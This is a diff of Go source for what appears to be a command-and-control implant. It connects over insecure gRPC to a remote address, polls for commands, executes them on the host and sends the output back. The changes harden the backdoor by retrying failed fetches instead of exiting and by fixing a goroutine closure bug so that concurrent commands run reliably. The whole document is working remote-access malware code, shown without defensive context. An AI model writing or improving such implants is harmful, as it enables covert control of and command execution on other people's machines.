@@ -34,7 +34,7 @@ func main()  {
 	opts = append(opts, grpc.WithInsecure())
 	conn, err := grpc.Dial(implantAddr, opts...)
 	if err != nil {
-		log.Fatal(err)
+		log.Fatal("DIAL", err)
 	}
 	defer conn.Close()
 
@@ -45,22 +45,24 @@ func main()  {
 		var req = new(grpcapi.Empty)
 		cmd, err := client.FetchCommand(ctx, req)
 		if err != nil {
-			log.Fatalln(err)
+			log.Error(err)
+			time.Sleep(3 * time.Second) // retry fetching
+			continue
 		}
 		if cmd.In == "" {
 			time.Sleep(3 * time.Second)
 			continue
 		}
 
-		go func() {
-			log.Info("Running Command: ", cmd.In)
-			c := runCmd(cmd.In)
+		go func(command *grpcapi.Command) {
+			log.Info("Running Command: ", command.In)
+			c := runCmd(command.In)
 			buf, err := c.CombinedOutput()
 			if err != nil {
-				cmd.Out = err.Error()
+				command.Out = err.Error()
 			}
-			cmd.Out += string(buf)
-			client.SendOutputs(ctx, cmd)
-		}()
+			command.Out += string(buf)
+			client.SendOutputs(ctx, command)
+		}(cmd)
 	}
 }
